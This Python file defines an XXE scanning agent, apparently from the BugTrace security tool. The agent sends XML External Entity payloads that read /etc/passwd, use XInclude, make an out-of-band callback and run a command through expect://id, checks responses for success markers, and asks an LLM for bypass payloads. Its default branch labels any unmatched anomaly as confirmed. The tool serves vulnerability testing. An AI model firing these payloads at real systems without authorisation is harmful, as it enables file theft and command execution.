from typing import Dict, List, Optional, Any
import aiohttp
from bugtrace.agents.base import BaseAgent
from bugtrace.core.http_orchestrator import orchestrator, DestinationType
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.core.queue import queue_manager
from bugtrace.core.event_bus import EventType
from bugtrace.core.config import settings
from bugtrace.core.ui import dashboard
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
)
from bugtrace.utils.logger import get_logger

# v3.2.0: Import TechContextMixin for context-aware detection
from bugtrace.agents.mixins.tech_context import TechContextMixin

logger = get_logger(__name__)

class XXEAgent(BaseAgent, TechContextMixin):
    """
    Specialist Agent for XML External Entity (XXE).
    Target: Endpoints consuming XML.
    """

    def __init__(self, url: str, event_bus: Any = None):
        super().__init__(
            name="XXEAgent",
            role="XXE Specialist",
            event_bus=event_bus,
            agent_id="xxe_agent"
        )
        self.url = url
        self.MAX_BYPASS_ATTEMPTS = 5

        # Queue consumption mode (Phase 20)
        self._queue_mode = False
        self._worker_pool: Optional[WorkerPool] = None
        self._scan_context: str = ""

        # Expert deduplication: Track emitted findings by fingerprint
        self._emitted_findings: set = set()  # (url_normalized, vuln_signature)

        # WET → DRY transformation (Two-phase processing)
        self._dry_findings: List[Dict] = []  # Dedup'd findings after Phase A

        # v3.2.0: Context-aware tech stack (loaded in start_queue_consumer)
        self._tech_stack_context: Dict = {}
        self._xxe_prime_directive: str = ""

    def _determine_validation_status(self, payload: str, evidence: str = "success") -> str:
        """
        Determine tiered validation status for XXE finding.

        TIER 1 (VALIDATED_CONFIRMED): Definitive proof
            - File content exfiltrated (/etc/passwd)
            - OOB callback received (Interactsh hit)
            - DTD loaded with external entity

        TIER 2 (PENDING_VALIDATION): Needs verification
            - Error-based XXE (shows path but not content)
            - Blind XXE without OOB confirmation
        """
        # TIER 1: File disclosure confirmed
        if "passwd" in payload or "root:x:" in evidence:
            logger.info(f"[{self.name}] File disclosure confirmed - VALIDATED_CONFIRMED")
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: OOB callback triggered
        if "Triggered" in evidence or "oob" in evidence.lower():
            logger.info(f"[{self.name}] OOB callback confirmed - VALIDATED_CONFIRMED")
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: DTD loaded successfully
        if "dtd" in payload.lower() and "loaded" in evidence.lower():
            logger.info(f"[{self.name}] DTD loaded confirmed - VALIDATED_CONFIRMED")
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: Entity confirmed in response
        if "BUGTRACE_XXE_CONFIRMED" in evidence:
            logger.info(f"[{self.name}] Entity confirmation - VALIDATED_CONFIRMED")
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 2: Error-based XXE (shows path but not file content)
        if "failed to load" in evidence.lower() or "no such file" in evidence.lower():
            logger.info(f"[{self.name}] Error-based XXE - PENDING_VALIDATION")
            return ValidationStatus.PENDING_VALIDATION.value

        # Default: High-confidence specialist trust
        logger.info(f"[{self.name}] XXE anomaly detected - VALIDATED_CONFIRMED (Specialist Trust)")
        return ValidationStatus.VALIDATED_CONFIRMED.value

    def _get_validation_status_from_evidence(self, evidence: Dict) -> str:
        """
        Determine validation status from evidence dictionary.

        Used by queue consumer for standardized event emission.
        """
        # TIER 1: File content exfiltrated
        if evidence.get("file_content"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: OOB hit confirmed
        if evidence.get("oob_hit") or evidence.get("interactsh_hit"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: DTD loaded successfully
        if evidence.get("dtd_loaded"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 2: Error-based (needs verification)
        if evidence.get("error_based"):
            return ValidationStatus.PENDING_VALIDATION.value

        # Default: High-confidence
        return ValidationStatus.VALIDATED_CONFIRMED.value
        
    def _get_initial_xxe_payloads(self) -> list:
        """Get baseline XXE payloads for testing."""
        return [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe "BUGTRACE_XXE_CONFIRMED" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "bar" "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_bugtrace_test">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % param_xxe SYSTEM "http://127.0.0.1:5150/nonexistent_oob"> %param_xxe;]><foo>test</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
        ]

    async def _test_heuristic_payloads(self, session) -> tuple:
        """Test initial payloads and return (successful_payloads, best_payload)."""
        successful_payloads, best_payload = [], None
        for p in self._get_initial_xxe_payloads():
            if await self._test_xml(session, p):
                successful_payloads.append(p)
                if not best_payload or ("passwd" in p and "passwd" not in best_payload):
                    best_payload = p
        return successful_payloads, best_payload

    async def _try_llm_bypass(self, session, previous_response: str) -> tuple:
        """Try LLM-driven bypass. Returns (successful_payloads, best_payload)."""
        for attempt in range(self.MAX_BYPASS_ATTEMPTS):
            dashboard.log(f"[{self.name}] 🔄 Bypass attempt {attempt+1}/{self.MAX_BYPASS_ATTEMPTS}", "INFO")
            strategy = await self._llm_get_strategy(previous_response)
            if not strategy or not strategy.get('payload'):
                break
            payload = strategy['payload']
            if await self._test_xml(session, payload):
                return [payload], payload
        return [], None

    async def run_loop(self) -> Dict:
        logger.info(f"[{self.name}] Testing XML Injection on {self.url}")

        # Use orchestrator for lifecycle-tracked connections
        async with orchestrator.session(DestinationType.TARGET) as session:
            # Phase 1: Heuristic Checks
            successful_payloads, best_payload = await self._test_heuristic_payloads(session)

            # Phase 2: LLM-Driven Bypass (if heuristics failed)
            if not successful_payloads:
                bypass_payloads, bypass_best = await self._try_llm_bypass(session, "")
                successful_payloads.extend(bypass_payloads)
                best_payload = bypass_best

        if successful_payloads:
            return {"vulnerable": True, "findings": [self._create_finding(best_payload, successful_payloads)]}

        return {"vulnerable": False, "findings": []}

    def _create_finding(self, payload: str, successful_payloads: List[str] = None) -> Dict:
        severity = "HIGH"
        if "passwd" in payload or "XInclude" in payload:
            severity = "CRITICAL"

        return {
            "type": "XXE",
            "url": self.url,
            "payload": payload,
            "description": f"XML External Entity (XXE) vulnerability detected. Payload allows reading local files or triggering SSRF. Severity: {severity}",
            "severity": severity,
            "validated": True,
            "status": self._determine_validation_status(payload),
            "successful_payloads": successful_payloads or [payload],
            "reproduction": f"curl -X POST '{self.url}' -H 'Content-Type: application/xml' -d '{payload[:150]}...'",
            "cwe_id": get_cwe_for_vuln("XXE"),
            "remediation": get_remediation_for_vuln("XXE"),
            "cve_id": "N/A",
            "http_request": f"POST {self.url}\nContent-Type: application/xml\n\n{payload[:200]}",
            "http_response": "Local file content or entity reference detected in response",
        }

    async def _test_xml(self, session, xml_body) -> bool:
        try:
            dashboard.update_task("XXE Agent", status="Injecting Entity...")
            headers = {'Content-Type': 'application/xml'}

            self.think(f"Testing Payload: {xml_body[:60]}...")

            async with session.post(self.url, data=xml_body, headers=headers, timeout=5) as resp:
                text = await resp.text()
                return self._check_xxe_indicators(text)

        except Exception as e:
            logger.debug(f"XXE Request failed: {e}")
            return False

    def _check_xxe_indicators(self, text: str) -> bool:
        """Check response text for XXE success indicators."""
        # Success Indicators
        indicators = [
            "root:x:0:0",                  # /etc/passwd success
            "BUGTRACE_XXE_CONFIRMED",      # Internal Entity success
            "[extensions] found",          # Win.ini success (if testing windows)
            "failed to load external entity", # Error-based success (often confirms processing)
            "No such file or directory",    # Error-based success
            "uid=0(root)",                  # RCE success (expect://)
            "XXE OOB Triggered"             # Blind Detection (Simulated)
        ]

        # Check indicators
        for ind in indicators:
            if ind in text:
                self.think(f"SUCCESS: Indicator '{ind}' found in response.")
                return True

        # Check for XInclude reflection (if we tried XInclude)
        if "root:x:0:0" in text:
            self.think("SUCCESS: /etc/passwd content found (XInclude or Entity).")
            return True

        return False
        
    async def _llm_get_strategy(self, previous_response: str) -> Dict:
        """Call LLM to generate or refine the XXE bypass strategy."""
        system_prompt = self.system_prompt
        user_prompt = f"Target URL: {self.url}"
        if previous_response:
            user_prompt += f"\n\nPrevious attempt failed. Response snippet:\n{previous_response[:1000]}"
            user_prompt += "\n\nTry a different bypass (e.g. XInclude, parameter entities, UTF-16 encoding)."

        from bugtrace.core.llm_client import llm_client
        response = await llm_client.generate(
            prompt=user_prompt,
            system_prompt=system_prompt,
            module_name="XXE_AGENT"
        )

        from bugtrace.utils.parsers import XmlParser
        tags = ["payload", "vulnerable", "context", "confidence"]
        return XmlParser.extract_tags(response, tags)

    # =========================================================================
    # QUEUE CONSUMPTION MODE (Phase 20) - WET→DRY Two-Phase Processing
    # =========================================================================

    async def analyze_and_dedup_queue(self) -> List[Dict]:
        """
        Phase A: Global analysis of WET list with LLM-powered deduplication.

        Process:
        1. Wait for queue to have items (max 300s - matches team.py timeout)
        2. Drain ALL items until queue is stable empty (10 consecutive checks)
        3. LLM analysis with agent-specific dedup rules (fallback to fingerprints)
        4. Return DRY list (deduplicated findings)

        Returns:
            List of deduplicated findings (DRY list)
        """
        import asyncio
        import time
        from bugtrace.core.queue import queue_manager

        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")

        queue = queue_manager.get_queue("xxe")
        wet_findings = []

        # 1. Wait for queue to have items (max 300s - matches team.py timeout)
        wait_start = time.monotonic()
        max_wait = 300.0

        while (time.monotonic() - wait_start) < max_wait:
            depth = queue.depth() if hasattr(queue, 'depth') else 0
            if depth > 0:
                logger.info(f"[{self.name}] Phase A: Queue has {depth} items, starting drain...")
                break
            await asyncio.sleep(0.5)
        else:
            logger.info(f"[{self.name}] Phase A: Queue timeout - no items appeared")
            return []

        # 2. Drain ALL items until queue is stable empty (10 consecutive empty checks)
        empty_count = 0
        max_empty_checks = 10

        while empty_count < max_empty_checks:
            item = await queue.dequeue(timeout=0.5)
            if item is None:
                empty_count += 1
                await asyncio.sleep(0.5)
                continue

            empty_count = 0  # Reset on successful dequeue

            # Extract finding from queue item
            finding = item.get("finding", {})
            url = finding.get("url", "")

            if url:
                wet_findings.append({
                    "url": url,
                    "finding": finding,
                    "scan_context": item.get("scan_context", self._scan_context)
                })

        logger.info(f"[{self.name}] Phase A: Drained {len(wet_findings)} WET findings from queue")

        if not wet_findings:
            logger.info(f"[{self.name}] Phase A: No findings to deduplicate")
            return []

        # 3. LLM analysis and dedup (with fingerprint fallback)
        try:
            dry_list = await self._llm_analyze_and_dedup(wet_findings, self._scan_context)
        except Exception as e:
            logger.error(f"[{self.name}] LLM dedup failed: {e}. Falling back to fingerprint dedup")
            dry_list = self._fallback_fingerprint_dedup(wet_findings)

        # 4. Store and return DRY list
        self._dry_findings = dry_list

        dup_count = len(wet_findings) - len(dry_list)
        logger.info(f"[{self.name}] Phase A: Deduplication complete. {len(wet_findings)} WET → {len(dry_list)} DRY ({dup_count} duplicates removed)")

        return dry_list

    async def _llm_analyze_and_dedup(self, wet_findings: List[Dict], context: str) -> List[Dict]:
        """
        LLM-powered intelligent deduplication with agent-specific rules.

        Returns:
            Deduplicated list of findings (DRY list)
        """
        from bugtrace.core.llm_client import llm_client
        import json

        # v3.2: Extract tech stack info for prompt
        tech_stack = getattr(self, '_tech_stack_context', {}) or {}
        lang = tech_stack.get('lang', 'generic')
        server = tech_stack.get('server', 'generic')

        # Get XXE-specific context prompts
        xxe_prime_directive = getattr(self, '_xxe_prime_directive', '')
        xxe_dedup_context = self.generate_xxe_dedup_context(tech_stack) if tech_stack else ''

        # Infer XML parser for context
        xml_parser = self._infer_xml_parser(lang)

        prompt = f"""You are analyzing {len(wet_findings)} potential XXE findings.

{xxe_prime_directive}

{xxe_dedup_context}

## TARGET CONTEXT
- Language: {lang}
- Server: {server}
- Likely XML Parser: {xml_parser}

WET LIST:
{json.dumps(wet_findings, indent=2)}

Return JSON array of UNIQUE findings only:
{{"findings": [...]}}
"""

        system_prompt = f"""You are an expert security analyst specializing in XXE deduplication.

{xxe_prime_directive}

Focus on endpoint-based deduplication. Same XML endpoint = single XXE vulnerability."""

        response = await llm_client.generate(
            prompt=prompt,
            system_prompt=system_prompt,
            module_name="XXE_DEDUP",
            temperature=0.2  # Low temperature for consistent dedup
        )

        try:
            result = json.loads(response)
            return result.get("findings", wet_findings)
        except json.JSONDecodeError:
            logger.warning(f"[{self.name}] LLM returned invalid JSON, using fallback")
            return self._fallback_fingerprint_dedup(wet_findings)

    def _fallback_fingerprint_dedup(self, wet_findings: List[Dict]) -> List[Dict]:
        """
        Fallback fingerprint-based deduplication (no LLM).

        Uses existing `_generate_xxe_fingerprint()` method to identify duplicates.

        Args:
            wet_findings: All findings from queue

        Returns:
            Deduplicated findings list
        """
        seen_fingerprints = set()
        dry_list = []

        for finding_data in wet_findings:
            url = finding_data.get("url", "")

            if not url:
                continue

            # Generate fingerprint using existing method
            fingerprint = self._generate_xxe_fingerprint(url)

            if fingerprint not in seen_fingerprints:
                seen_fingerprints.add(fingerprint)
                dry_list.append(finding_data)

        return dry_list

    async def exploit_dry_list(self) -> List[Dict]:
        """
        Phase B: Exploit DRY list (deduplicated findings only).

        Process:
        1. For each DRY finding, execute XXE attack
        2. Check fingerprint before emitting (prevent race conditions)
        3. Emit VULNERABILITY_DETECTED events for validated findings

        Returns:
            List of validated findings
        """
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
        logger.info(f"[{self.name}] Phase B: Exploiting {len(self._dry_findings)} DRY findings...")

        validated_findings = []

        for idx, finding_data in enumerate(self._dry_findings, 1):
            url = finding_data.get("url", "")
            finding = finding_data.get("finding", {})

            logger.info(f"[{self.name}] Phase B [{idx}/{len(self._dry_findings)}]: Testing {url}")

            try:
                # Execute XXE attack using existing method
                self.url = url
                result = await self._test_single_url_from_queue(url, finding)

                if result and result.get("validated"):
                    validated_findings.append(result)

                    # FINGERPRINT CHECK: Prevent duplicate emissions
                    fingerprint = self._generate_xxe_fingerprint(url)

                    if fingerprint not in self._emitted_findings:
                        self._emitted_findings.add(fingerprint)

                        # Emit VULNERABILITY_DETECTED event
                        if self.event_bus and settings.WORKER_POOL_EMIT_EVENTS:
                            status = result.get("status", ValidationStatus.VALIDATED_CONFIRMED.value)

                            await self.event_bus.emit(EventType.VULNERABILITY_DETECTED, {
                                "specialist": "xxe",
                                "finding": {
                                    "type": "XXE",
                                    "url": result.get("url"),
                                    "payload": result.get("payload"),
                                    "severity": result.get("severity"),
                                    "description": result.get("description"),
                                    "reproduction": result.get("reproduction"),
                                },
                                "status": status,
                                "validation_requires_cdp": status == ValidationStatus.PENDING_VALIDATION.value,
                                "scan_context": self._scan_context,
                            })

                        logger.info(f"[{self.name}] ✅ Emitted unique XXE finding: {url}")
                    else:
                        logger.debug(f"[{self.name}] ⏭️  Skipped duplicate: {fingerprint}")

            except Exception as e:
                logger.error(f"[{self.name}] Phase B [{idx}/{len(self._dry_findings)}]: Attack failed: {e}")
                continue

        logger.info(f"[{self.name}] Phase B: Exploitation complete. {len(validated_findings)} validated findings")

        return validated_findings

    async def _generate_specialist_report(self, findings: List[Dict]) -> str:
        """
        Generate specialist report after exploitation.

        Steps:
        1. Summarize findings (validated vs pending)
        2. Technical analysis per finding
        3. Save to: reports/<domain>_<timestamp>/specialists/xxe_report.json

        Returns:
            Path to generated report
        """
        import json
        import aiofiles
        from datetime import datetime
        from bugtrace.core.config import settings

        # v3.1: Use unified report_dir if injected, else fallback to scan_context
        scan_dir = getattr(self, 'report_dir', None)
        if not scan_dir:
            scan_id = self._scan_context.split("/")[-1]
            scan_dir = settings.BASE_DIR / "reports" / scan_id
        # v3.2: Write to specialists/results/ for unified wet→dry→results flow
        results_dir = scan_dir / "specialists" / "results"
        results_dir.mkdir(parents=True, exist_ok=True)

        # Build report
        report = {
            "agent": f"{self.name}",
            "timestamp": datetime.now().isoformat(),
            "scan_context": self._scan_context,
            "phase_a": {
                "wet_count": len(self._dry_findings) + (len(findings) if findings else 0),  # Approximate
                "dry_count": len(self._dry_findings),
                "duplicates_removed": 0,  # Calculated in analyze_and_dedup_queue
                "dedup_method": "llm_with_fingerprint_fallback"
            },
            "phase_b": {
                "validated_count": len([f for f in findings if f.get("validated")]),
                "pending_count": len([f for f in findings if not f.get("validated")]),
                "total_findings": len(findings)
            },
            "findings": findings
        }

        # Write report
        report_path = results_dir / "xxe_results.json"
        async with aiofiles.open(report_path, 'w') as f:
            await f.write(json.dumps(report, indent=2))

        logger.info(f"[{self.name}] Specialist report saved: {report_path}")

        return str(report_path)

    async def start_queue_consumer(self, scan_context: str) -> None:
        """
        TWO-PHASE queue consumer (WET → DRY).

        Phase A: Analyze and deduplicate ALL WET findings from queue
        Phase B: Exploit DRY list (deduplicated findings only)

        NO infinite loop - processes once and terminates.
        """
        from bugtrace.agents.specialist_utils import (
            report_specialist_start,
            report_specialist_done,
            report_specialist_wet_dry,
        )

        self._queue_mode = True
        self._scan_context = scan_context

        # v3.2: Load context-aware tech stack for intelligent deduplication
        await self._load_xxe_tech_context()

        logger.info(f"[{self.name}] Starting TWO-PHASE queue consumer (WET → DRY)")

        # Get initial queue depth for telemetry
        queue = queue_manager.get_queue("xxe")
        initial_depth = queue.depth()
        report_specialist_start(self.name, queue_depth=initial_depth)

        # PHASE A: ANALYSIS & DEDUPLICATION
        logger.info(f"[{self.name}] ===== PHASE A: Analyzing WET list =====")
        dry_list = await self.analyze_and_dedup_queue()

        # Report WET→DRY metrics for integrity verification
        report_specialist_wet_dry(self.name, initial_depth, len(dry_list) if dry_list else 0)

        if not dry_list:
            logger.info(f"[{self.name}] No findings to exploit after deduplication")
            report_specialist_done(self.name, processed=0, vulns=0)
            return  # ✅ Terminate (no loop)

        # PHASE B: EXPLOITATION
        logger.info(f"[{self.name}] ===== PHASE B: Exploiting DRY list =====")
        results = await self.exploit_dry_list()

        # Count confirmed vulnerabilities
        vulns_count = len([r for r in results if r]) if results else 0
        vulns_count += len(self._dry_findings) if hasattr(self, '_dry_findings') else 0

        # REPORTING
        if results or self._dry_findings:
            await self._generate_specialist_report(results)

        # Report completion with final stats
        report_specialist_done(
            self.name,
            processed=len(dry_list),
            vulns=vulns_count
        )

        logger.info(f"[{self.name}] Queue consumer complete: {len(results)} validated findings")
        # Method ends - agent terminates ✅

    async def _process_queue_item(self, item: dict) -> Optional[Dict]:
        """Process a single item from the xxe queue."""
        finding = item.get("finding", {})
        url = finding.get("url")

        if not url:
            logger.warning(f"[{self.name}] Invalid queue item: missing url")
            return None

        self.url = url
        return await self._test_single_url_from_queue(url, finding)

    async def _test_single_url_from_queue(self, url: str, finding: dict) -> Optional[Dict]:
        """Test a single URL from queue for XXE."""
        try:
            # Use orchestrator for lifecycle-tracked connections
            async with orchestrator.session(DestinationType.TARGET) as session:
                # Test with heuristic payloads
                successful_payloads, best_payload = await self._test_heuristic_payloads(session)

                if successful_payloads:
                    return self._create_finding(best_payload, successful_payloads)

                # Try LLM bypass if heuristics failed
                bypass_payloads, bypass_best = await self._try_llm_bypass(session, "")
                if bypass_payloads:
                    return self._create_finding(bypass_best, bypass_payloads)

                return None
        except Exception as e:
            logger.error(f"[{self.name}] Queue item test failed: {e}")
            return None

    def _generate_xxe_fingerprint(self, url: str) -> tuple:
        """
        Generate XXE finding fingerprint for expert deduplication.

        XXE in XML endpoints is typically tied to the endpoint itself,
        not specific parameters. Multiple findings on the same XML endpoint
        are considered duplicates.

        Args:
            url: Target URL

        Returns:
            Tuple of (normalized_url, vuln_type) for deduplication
        """
        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(url)

        # Normalize URL: remove query params (productId doesn't matter for XXE)
        # /catalog/product?productId=2 → /catalog/product
        # /catalog/product?productId=10 → /catalog/product (SAME VULNERABILITY)
        normalized_path = parsed.path.rstrip('/')

        # XXE signature: (scheme, host, path)
        # This groups all XXE findings on the same XML endpoint together
        fingerprint = (parsed.scheme, parsed.netloc, normalized_path, "XXE")

        return fingerprint

    async def _handle_queue_result(self, item: dict, result: Optional[Dict]) -> None:
        """Handle completed queue item processing."""
        if result is None:
            return

        # Build evidence from result for validation status determination
        payload = result.get("payload", "")
        http_response = result.get("http_response", "")
        evidence = {
            "file_content": "root:x:" in http_response or "passwd" in payload,
            "oob_hit": "oob" in http_response.lower() or "triggered" in http_response.lower(),
            "dtd_loaded": "dtd" in payload.lower(),
            "error_based": "failed to load" in http_response.lower() or "no such file" in http_response.lower(),
        }

        # Determine validation status
        status = self._get_validation_status_from_evidence(evidence)

        # EXPERT DEDUPLICATION: Check if we already emitted this finding
        url = result.get("url", "")
        fingerprint = self._generate_xxe_fingerprint(url)

        if fingerprint in self._emitted_findings:
            logger.info(f"[{self.name}] Skipping duplicate XXE finding: {url} (already reported)")
            return

        # Mark as emitted
        self._emitted_findings.add(fingerprint)

        if self.event_bus and settings.WORKER_POOL_EMIT_EVENTS:
            await self.event_bus.emit(EventType.VULNERABILITY_DETECTED, {
                "specialist": "xxe",
                "finding": {
                    "type": "XXE",
                    "url": result.get("url"),
                    "payload": result.get("payload"),
                },
                "status": status,
                "validation_requires_cdp": status == ValidationStatus.PENDING_VALIDATION.value,
                "scan_context": self._scan_context,
            })

        logger.info(f"[{self.name}] Confirmed XXE: {result.get('url')} [status={status}]")

    async def _on_work_queued(self, data: dict) -> None:
        """Handle work_queued_xxe notification (logging only)."""
        logger.debug(f"[{self.name}] Work queued: {data.get('finding', {}).get('url', 'unknown')}")

    async def stop_queue_consumer(self) -> None:
        """Stop queue consumer mode gracefully."""
        if self._worker_pool:
            await self._worker_pool.stop()
            self._worker_pool = None

        if self.event_bus:
            self.event_bus.unsubscribe(
                EventType.WORK_QUEUED_XXE.value,
                self._on_work_queued
            )

        self._queue_mode = False
        logger.info(f"[{self.name}] Queue consumer stopped")

    def get_queue_stats(self) -> dict:
        """Get queue consumer statistics."""
        if not self._worker_pool:
            return {"mode": "direct", "queue_mode": False}

        return {
            "mode": "queue",
            "queue_mode": True,
            "worker_stats": self._worker_pool.get_stats(),
        }

    # =========================================================================
    # TECH CONTEXT LOADING (v3.2)
    # =========================================================================

    async def _load_xxe_tech_context(self) -> None:
        """
        Load technology stack context from recon data (v3.2).

        Uses TechContextMixin methods to load and generate context-aware
        prompts for XXE-specific deduplication (XML parser detection).
        """
        from pathlib import Path

        # Determine report directory
        scan_id = self._scan_context.split("/")[-1] if self._scan_context else ""
        scan_dir = settings.BASE_DIR / "reports" / scan_id if scan_id else None

        if not scan_dir or not Path(scan_dir).exists():
            logger.debug(f"[{self.name}] No report directory found, using generic tech context")
            self._tech_stack_context = {"db": "generic", "server": "generic", "lang": "generic"}
            self._xxe_prime_directive = ""
            return

        # Use TechContextMixin methods
        self._tech_stack_context = self.load_tech_stack(Path(scan_dir))
        self._xxe_prime_directive = self.generate_xxe_context_prompt(self._tech_stack_context)

        lang = self._tech_stack_context.get("lang", "generic")
        xml_parser = self._infer_xml_parser(lang)

        logger.info(f"[{self.name}] XXE tech context loaded: lang={lang}, parser={xml_parser}")
